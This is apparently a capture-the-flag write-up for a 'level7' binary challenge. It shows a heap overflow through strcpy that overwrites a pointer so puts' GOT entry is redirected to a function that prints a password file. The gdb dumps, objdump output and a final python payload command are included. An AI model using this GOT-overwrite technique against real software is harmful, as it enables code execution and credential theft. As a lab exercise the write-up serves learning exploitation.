# overwrite GOT section

### Context 

Main function call several time, malloc and strcpy, finish by opening the passwd and store it inside a global var 'c'.

```c
strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
__stream = fopen("/home/user/level8/.pass","r");
fgets(c,0x44,__stream);
puts("~~");
```

Strcpy is again not protected because both dest are 8 byte long, and the src is our argv[1] and argv[2].

There is also a winnig function printing the buffer c, where is store the passwd.

### Exploit

#### Theory

Lets control the code execution by overwriting the GOT (global offset table).

What is Global Offset Table (GOT) ? 

Got is a section which contain the addresses of dynamically linked functions. When you first time you program, libc func like (puts) are undefined, and they are store in the .plt section. If you disas this code, you can see that its jumping to another address. ld.so (dynamic linker/loader) gonna find the puts inside the libc and write the address in the GOT.

Wonderful, puts it is call in the programm, it mean, if we find it address in the GOT, we can overwrite it content by a pointer to m function. 

#### Payload

- first let's see what happen in the heap when i ```./level7 AAAAAAAAA BBBBBBBB```

```c
(gdb) x/30xw 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
0x804a030:	0x00000000	0x00000011	0x42424242	0x42424242
0x804a040:	0x00000000	0x00020fc1	0xfbad240c	0x00000000
```
0x0804a038 seems to be the pointer to overwrite. I need write, 20 byte to overwrite it.

- I run it again with ```./level7 AAAAAAAAAAAAAAAAAAAABBBB BBBBBBBB```, i should seg because, it try writing BBBBBBBB at address `0x42424242`. I put a breakpoint in gdb, before the bot strcpy and print register eax, which contain the pointer to dest.

first call seems logic.
```c
(gdb) info register
eax            0x804a018	134520856
```

second call:
```c
(gdb) info register
eax            0x42424242	1111638594
```

Nice, address 0x42424242 is load into strcpy as the dest address.

- We need to replace it with the got address of Puts:

```bash
objdump -D level7 |grep puts
08048400 <puts@plt>:
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
```

There we have puts in the plt section, so its no link. I run the program in gdb a disas the address puts@plt:

```c
disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
```

Nice, the jump is the address load int GOT section, so the real puts ! 

Last step is to look for m function: for overwrite the content of puts.

```c
objdump -t level7 | grep m
080484f4 g     F .text	0000002d              m
```

Final payload:

```bash
./level7 $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 20 + b"\x28\x99\x04\x08")') $(python2.7 -c 'import sys; sys.stdout.write(b"\xf4\x84\x04\x08")')
```

As you can see in GDB: if I print the heap: 

```c
(gdb) x/30wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928
```

Address of second dest as been well overwrite with the address of puts. And if i print the value pointed bye puts i got the m func:

```c
x/wx *0x8049928
0x80484f4 <m>:	0x83e58955
disas 0x080484f4
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret
```

it print out the .pass !